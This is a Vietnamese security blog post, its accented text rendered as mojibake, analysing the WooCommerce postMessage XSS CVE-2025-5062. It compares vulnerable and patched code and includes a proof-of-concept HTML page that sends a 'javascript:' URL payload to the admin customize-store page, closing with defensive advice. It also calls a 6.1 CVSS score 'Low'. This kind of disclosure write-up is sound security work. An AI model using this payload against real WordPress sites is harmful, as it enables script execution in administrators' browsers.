# CVE-2025-5062 Analysis & POC


<!--more-->

## CVE & Basic Info

Plugin WooCommerce cho WordPress cÃ³ lá»— há»•ng **Cross-Site Scripting (XSS) dá»±a trÃªn PostMessage** thÃ´ng qua trang **'customize-store'** á»Ÿ táº¥t cáº£ cÃ¡c phiÃªn báº£n Ä‘áº¿n vÃ  bao gá»“m **9.4.2**, do viá»‡c **xá»­ lÃ½ dá»¯ liá»‡u PostMessage chÆ°a Ä‘á»§ an toÃ n** (khÃ´ng lá»c Ä‘áº§u vÃ o vÃ  khÃ´ng escape dá»¯ liá»‡u khi xuáº¥t ra). Äiá»u nÃ y cho phÃ©p **káº» táº¥n cÃ´ng khÃ´ng cáº§n xÃ¡c thá»±c** chÃ¨n cÃ¡c Ä‘oáº¡n script tÃ¹y Ã½ vÃ o trang web, mÃ  sáº½ thá»±c thi náº¿u há» lá»«a Ä‘Æ°á»£c ngÆ°á»i dÃ¹ng thá»±c hiá»‡n má»™t hÃ nh Ä‘á»™ng, vÃ­ dá»¥ nhÆ° **click vÃ o má»™t liÃªn káº¿t**.

* **CVE ID**: [CVE-2025-5062](https://www.cve.org/CVERecord?id=CVE-2025-5062)
* **Vulnerability Type**: Cross Site Scripting (XSS)
* **Affected Versions**: <= 9.3.2 and from 9.4 through 9.4.2
* **Patched Versions**: 9.3.4 and 9.4.3
* **CVSS severity**: Low (6.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress WooCommerce Plugin](https://wordpress.org/plugins/woocommerce/)

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **WooCommerce**: **9.4.2** (vulnerable) vÃ  **9.4.3** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ so sÃ¡nh (diff) nÃ o Ä‘á»ƒ kiá»ƒm tra vÃ  so sÃ¡nh khÃ¡c biá»‡t giá»¯a hai phiÃªn báº£n.

## Analysis

### Patch diff

Trong phiÃªn báº£n **vulnerable**, `attachParentListeners()` láº¯ng nghe táº¥t cáº£ cÃ¡c message tá»« báº¥t ká»³ nguá»“n nÃ o mÃ  khÃ´ng kiá»ƒm tra origin, dá»¯ liá»‡u tá»« message Ä‘Æ°á»£c gÃ¡n trá»±c tiáº¿p vÃ o DOM dáº«n Ä‘áº¿n nguy cÆ¡ **PostMessage-Based XSS** (sub-type cá»§a **DOM-based XSS**).

```js
export function attachParentListeners() {
	const listener = ( event ) => {
    if ( event.data.type === 'navigate' ) {
			window.location.href = event.data.url;
    }
	};
  window.addEventListener( 'message', listener, false );
  return () => {
    window.removeEventListener( 'message', listener, false );
  };
}
```

{: file="client/admin/client/customize-store/utils.js v9.4.2"}

Trong phiÃªn báº£n **patched**, mÃ£ Ä‘Ã£ bá»• sung nhiá»u lá»›p kiá»ƒm tra vÃ  háº¡n cháº¿ so vá»›i phiÃªn báº£n vulnerable, chuyá»ƒn tá»« `â€œcháº¥p nháº­n má»i message vÃ  redirect tháº³ngâ€` sang `â€œchá»‰ cháº¥p nháº­n message Ä‘Ã¡ng tin, xÃ¡c thá»±c cáº¥u trÃºc vÃ  kiá»ƒm tra URL trÆ°á»›c khi Ä‘iá»u hÆ°á»›ngâ€`

```js
export function attachParentListeners() {
  const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ];

	function handleMessage( event ) {
		// Validate the origin.
		if ( ! allowedOrigins.includes( event.origin ) ) {
			// Blocked message from untrusted origin: event.origin.
			return;
		}

		// Validate the structure of event.data.
		if (
			! event.data ||
			typeof event.data.type !== 'string' ||
			typeof event.data.url !== 'string'
		) {
			// Invalid message structure: event.data.
			return;
		}

		// Only allow the 'navigate' type.
		if ( event.data.type === 'navigate' ) {
      // Validate the URL format.
			try {
				const url = parseAdminUrl( event.data.url );
				// Further restrict navigation to trusted domains.
				if (
					! allowedOrigins.some( ( origin ) => url.origin === origin )
				) {
					throw new Error(
						`Blocked navigation to untrusted URL: ${ url.href }`
					);
				}

				window.location.href = url.href;
			} catch ( error ) {
				// Invalid URL: event.data.url.
				captureException( error );
			}
		}
    }
    window.addEventListener( 'message', handleMessage, false );
    	return function removeListener() {
		window.removeEventListener( 'message', handleMessage, false );
	};
}
```

{: file="client/admin/client/customize-store/utils.js v9.4.3"}

{{< figure src="dif1.png" caption="Diff â€” So sÃ¡nh thay Ä‘á»•i mÃ£ nguá»“n giá»¯a phiÃªn báº£n vulnerable vÃ  báº£n patched" >}}

### Vulnerable code

Tuy Ä‘Ã£ tÃ¬m ra source vÃ  sink, nhÆ°ng khi phÃ¢n tÃ­ch mÃ£ nguá»“n cá»§a plugin sau khi upload tÃ´i láº¡i khÃ´ng tÃ¬m Ä‘Æ°á»£c hÃ m `attachParentListeners()`

{{< figure src="search1.png" caption="Káº¿t quáº£ tÃ¬m kiáº¿m attachParentListeners()" >}}

TÃ´i nghÄ© mÃ¬nh Ä‘Ã£ setup sai nÃªn code khÃ´ng Ä‘Æ°á»£c táº£i vá» Ä‘áº§y Ä‘á»§. NhÆ°ng khÃ´ng, khi tÃ¬m vá»›i tá»« khÃ³a `"navigate"` tÃ´i nháº­n Ä‘Æ°á»£c hÃ m khÃ¡c tÃªn cÃ³ chá»©c nÄƒng tÆ°Æ¡ng tá»± `attachParentListeners()`

{{< figure src="search2.png" caption="Káº¿t quáº£ tÃ¬m kiáº¿m 'navigate'" >}}

ğŸ‘‰ Trong báº£n product, Ä‘á»ƒ tá»‘i Æ°u hÃ³a thá»i gian táº£i dá»¯ liá»‡u vá» trÃ¬nh duyá»‡t, plugin Ä‘Ã£ dÃ¹ng ká»¹ thuáº­t [minification](https://digitalm.sg/seo-terms/minification/) loáº¡i bá» khoáº£ng tráº¯ng, Ä‘áº·t tÃªn hÃ m, biáº¿n ngáº¯n vÃ  má»™t pháº§n obfuscation lÃ m cho mÃ£ khÃ³ Ä‘á»c hÆ¡n.

File Ä‘Æ°á»£c táº£i vá» cÃ³ tÃªn `5292.js` chá»© khÃ´ng pháº£i `utils.js`. Sau khi lÃ m Ä‘áº¹p code, tÃ´i tháº¥y `5292.js` chá»©a mÃ£ cá»§a `utils.js` vÃ  nhiá»u mÃ£ tá»« cÃ¡c file khÃ¡c.

Truy cáº­p trang `customize-store` vÃ  thá»­ gá»­i **postMessage** báº±ng console cá»§a trÃ¬nh duyá»‡t

```
http://localhost/wp-admin/admin.php?page=wc-admin&path=%2Fcustomize-store
```

{{< figure src="xss1.png" caption="Sá»± kiá»‡n alert() khi postMessage tá»« console browser" >}}

ğŸ‘‰ `alert()` Ä‘Æ°á»£c kÃ­ch hoáº¡t, sá»­ dá»¥ng debug trong trÃ¬nh duyá»‡t Ä‘á»ƒ xem `5292.js` Ä‘Æ°á»£c táº£i trong trÃ¬nh duyá»‡t

{{< figure src="debug1.png" caption="5292.js tá»« debug cá»§a browser" >}}

### Sources & Sinks

* **Source**: `event.data` tá»« `window.postMessage` (cá»¥ thá»ƒ `event.data.url`)
* **Sink**: `window.location.href = event.data.url`

## Exploit

### Proof of Concept (PoC)

* Táº¡o trang web vá»›i mÃ£ nguá»“n sau:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <button id="openPopup">Open Popup</button>

    <script>
        let popup;

        document.getElementById("openPopup").addEventListener("click", () => {
            // Má»Ÿ popup
            popup = window.open(
                "http://localhost/wp-admin/admin.php?page=wc-admin&path=%2Fcustomize-store", 
                "popupWindow",
                "width=400,height=300"
            );

            // Chá» popup load xong
            const interval = setInterval(() => {
                if (popup && !popup.closed) {
                    // Gá»­i message
                    popup.postMessage({ type: 'navigate', url: 'javascript:alert(\"phu0c ph4m\")' }, '*');
                    clearInterval(interval);
                }
            }, 5000);
        });
    </script>
</body>

</html>
```

* Admin truy cáº­p trang web vÃ  click `Open Popup`
* Sau 5s, sá»± kiá»‡n JavaScript Ä‘Æ°á»£c kÃ­ch hoáº¡t

{{< figure src="xss2.png" caption="Sá»± kiá»‡n JavaScript tá»« popup" >}}

ğŸ‘‰ ÄÃºng vá»›i mÃ´ táº£ CVE.

> Popup khÃ´ng thá»ƒ tá»± Ä‘á»™ng kÃ­ch hoáº¡t náº¿u khÃ´ng cÃ³ tÆ°Æ¡ng tÃ¡c cá»§a ngÆ°á»i dÃ¹ng
> {: .prompt-info }

á» Ä‘Ã¢y, ta khÃ´ng thá»ƒ sá»­ dá»¥ng `<iframe>` bá»Ÿi vÃ¬ `X-Frame-Options: SAMEORIGIN` Ä‘Æ°á»£c set trong response => chá»‰ khi cÃ¹ng origin má»›i nhÃºng Ä‘Æ°á»£c.

{{< figure src="req1.png" caption="X-Frame-Options: SAMEORIGIN Ä‘Æ°á»£c set trong response" >}}

## Conclusion

Lá»— há»•ng **CVE-2025-5062** trong plugin **WooCommerce <= 9.4.2** lÃ  **PostMessage-based DOM XSS**. Káº» táº¥n cÃ´ng khÃ´ng cáº§n xÃ¡c thá»±c cÃ³ thá»ƒ gá»­i message Ä‘á»™c háº¡i tá»›i trang **customize-store**, khiáº¿n trÃ¬nh duyá»‡t náº¡n nhÃ¢n thá»±c thi script. Báº£n vÃ¡ **9.4.3** Ä‘Ã£ kiá»ƒm tra origin, xÃ¡c thá»±c cáº¥u trÃºc dá»¯ liá»‡u vÃ  whitelist URL trÆ°á»›c khi redirect.

**Key takeaways**:

* **PostMessage-based DOM XSS** cÃ³ thá»ƒ thá»±c thi script khi ngÆ°á»i dÃ¹ng tÆ°Æ¡ng tÃ¡c (popup/link).
* Dá»¯ liá»‡u tá»« **postMessage** luÃ´n pháº£i coi lÃ  khÃ´ng tin cáº­y.
* LuÃ´n **validate origin, kiá»ƒm tra cáº¥u trÃºc dá»¯ liá»‡u vÃ  URL** trÆ°á»›c khi redirect.
* **Cáº­p nháº­t plugin** lÃªn báº£n vÃ¡ má»›i nháº¥t Ä‘á»ƒ ngÄƒn khai thÃ¡c.

## References

[Cross-site scripting (XSS) cheat sheet â€” PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress WooCommerce <= 9.3.2 and from 9.4 through 9.4.2 â€” CVE-2025-5062](https://patchstack.com/database/wordpress/plugin/woocommerce/vulnerability/wordpress-woocommerce-plugin-9-3-2-9-4-9-4-2-postmessage-based-cross-site-scripting)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-10-cve-2025-5062/  

